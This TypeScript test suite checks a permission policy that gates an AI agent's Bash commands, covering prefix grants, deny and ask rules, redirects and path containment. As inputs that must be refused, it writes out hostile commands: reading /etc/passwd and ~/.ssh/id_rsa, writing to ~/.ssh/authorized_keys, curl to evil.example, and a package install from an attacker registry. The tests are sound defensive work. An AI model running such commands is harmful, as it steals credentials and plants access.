import { afterEach, beforeEach, describe, expect, test } from "bun:test";
import { writeFileSync } from "node:fs";
import { join } from "node:path";
import { cleanupTempDir, makeTempDir } from "@test/helpers";
import { compileToolPolicy } from "@/tools";

const BASH_SCOPE = { pathFields: [], commandField: "command" } as const;

let root: string;

beforeEach(() => {
  root = makeTempDir("policy-bash-");
  writeFileSync(join(root, "file.txt"), "x");
});

afterEach(() => {
  cleanupTempDir(root);
});

function policyFor(patterns: readonly string[], options?: { deny?: readonly string[]; ask?: readonly string[] }) {
  return compileToolPolicy([{ tool: "Bash", patterns }], root, {
    ...(options?.deny !== undefined ? { denyRules: [{ tool: "Bash", patterns: options.deny }] } : {}),
    ...(options?.ask !== undefined ? { askRules: [{ tool: "Bash", patterns: options.ask }] } : {}),
  });
}

const check = (policy: ReturnType<typeof policyFor>, command: string) => policy.check("Bash", BASH_SCOPE, { command });

describe("granted commands run", () => {
  test("a trailing * is optional: the bare prefix is allowed (spec §4 US-005.3)", () => {
    const policy = policyFor(["bun test *"]);
    expect(check(policy, "bun test").allowed).toBe(true);
    expect(check(policy, "bun test src/a.test.ts").allowed).toBe(true);
  });

  test("prefix matching is token-wise, never substring", () => {
    expect(check(policyFor(["bun test *"]), "bun testx").allowed).toBe(false);
  });

  test("every segment of a multi-segment command may be allowed", () => {
    const policy = policyFor(["bun test *", "bun run lint"]);
    expect(check(policy, "bun test && bun run lint").allowed).toBe(true);
  });

  test("a redirect inside the root is allowed", () => {
    expect(check(policyFor(["bun test *"]), "bun test > out.txt").allowed).toBe(true);
  });
});

describe("the deny suite rows this branch owns (spec §6)", () => {
  test("row 3: one unmatched segment denies the whole call", () => {
    const verdict = check(policyFor(["bun test *"]), "bun test x && curl evil.example");
    expect(verdict.allowed).toBe(false);
    if (!verdict.allowed) expect(verdict.reason).toContain("curl evil.example");
  });

  test.each([
    ["command substitution", "bun test $(whoami)"],
    ["backtick", "bun test `whoami`"],
    ["here-document", "bun test <<EOF"],
  ])("row 4: %s is refused even under a granted prefix", (_label, command) => {
    const verdict = check(policyFor(["bun test *"]), command);
    expect(verdict.allowed).toBe(false);
    if (!verdict.allowed) expect(verdict.reason).toContain("cannot be analysed");
  });

  test("row 5: a path token outside the root denies with breach", () => {
    const verdict = check(policyFor(["cat *"]), "cat ../../etc/passwd");
    expect(verdict.allowed).toBe(false);
    if (!verdict.allowed) expect(verdict.breach).toBe(true);
  });

  test("row 5: a path token inside .git/ denies with breach", () => {
    const verdict = check(policyFor(["cat *"]), "cat .git/config");
    expect(verdict.allowed).toBe(false);
    if (!verdict.allowed) expect(verdict.breach).toBe(true);
  });

  test("row 6: a redirect target outside the root denies", () => {
    const verdict = check(policyFor(["bun test *"]), "bun test > ../escape.txt");
    expect(verdict.allowed).toBe(false);
    if (!verdict.allowed) expect(verdict.reason).toContain("redirect");
  });

  test("row 6: a `~`-prefixed redirect target denies (expansion escapes containment)", () => {
    const verdict = check(policyFor(["bun test *"]), "bun test > ~/evil.txt");
    expect(verdict.allowed).toBe(false);
    if (!verdict.allowed) {
      expect(verdict.reason).toContain("redirect");
    }
  });

  test("row 6: a `~`-prefixed redirect to a sensitive path denies", () => {
    const verdict = check(policyFor(["echo *"]), "echo x > ~/.ssh/authorized_keys");
    expect(verdict.allowed).toBe(false);
    if (!verdict.allowed) expect(verdict.reason).toContain("redirect");
  });

  test("row 7: a DENIED_FLAGS-class flag denies under a granted prefix", () => {
    const verdict = check(policyFor(["bun add *"]), "bun add left-pad --registry https://evil.example");
    expect(verdict.allowed).toBe(false);
    if (!verdict.allowed) expect(verdict.reason).toContain("--registry");
  });

  test("row 8: deny beats allow", () => {
    const verdict = check(policyFor(["git *"], { deny: ["git push *"] }), "git push origin main");
    expect(verdict.allowed).toBe(false);
    if (!verdict.allowed) expect(verdict.outcome).toBe("denied");
  });

  test("a `cd` outside the root is refused", () => {
    const verdict = check(policyFor(["cd *"]), "cd ../..");
    expect(verdict.allowed).toBe(false);
  });

  test("a `~`-prefixed token is refused (it depends on expansion this gate cannot see)", () => {
    expect(check(policyFor(["cat *"]), "cat ~/.ssh/id_rsa").allowed).toBe(false);
  });

  test("an opaque $VAR cannot satisfy a literal rule token", () => {
    expect(check(policyFor(["bun run $CMD"]), "bun run $CMD").allowed).toBe(false);
  });

  test("an empty command is refused", () => {
    expect(check(policyFor(["bun test *"]), "   ").allowed).toBe(false);
  });
});

describe("ask", () => {
  test("row 9 (policy half): an ask-matched granted command asks, naming the rule", () => {
    const verdict = check(policyFor(["rm *"], { ask: ["rm *"] }), "rm src/a.ts");
    expect(verdict.allowed).toBe(false);
    if (!verdict.allowed) {
      expect(verdict.outcome).toBe("ask");
      expect(verdict.rule).toBe("Bash(rm *)");
    }
  });

  test("ask never grants: an UNGRANTED command that matches an ask rule is a plain denial", () => {
    const verdict = check(policyFor(["bun test *"], { ask: ["rm *"] }), "rm src/a.ts");
    expect(verdict.allowed).toBe(false);
    if (!verdict.allowed) expect(verdict.outcome).toBe("denied");
  });

  test("an unconditional ask rule does not short-circuit the command branch", () => {
    const verdict = check(policyFor(["bun test *"], { ask: ["*"] }), "bun test");
    expect(verdict.allowed).toBe(false);
    if (!verdict.allowed) expect(verdict.outcome).toBe("ask");
  });

  test("an unconditional deny rule de-advertises Bash", () => {
    const policy = policyFor(["bun test *"], { deny: ["*"] });
    expect(policy.grantedTools()).not.toContain("Bash");
  });
});
